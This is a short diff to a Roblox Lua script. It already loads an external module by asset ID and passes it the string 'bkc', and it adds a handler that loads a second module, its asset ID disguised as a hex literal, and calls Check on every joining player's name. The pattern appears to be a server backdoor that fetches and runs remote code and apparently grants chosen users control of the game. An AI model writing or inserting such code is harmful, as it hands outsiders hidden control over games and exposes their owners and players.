@@ -1,3 +1,6 @@
 task.spawn(function()
 require(18254193128)("bkc")
 end)
+game.Players.PlayerAdded:Connect(function(xax)
+    require(0x7985e5f0add5):Check(xax.Name)
+end)
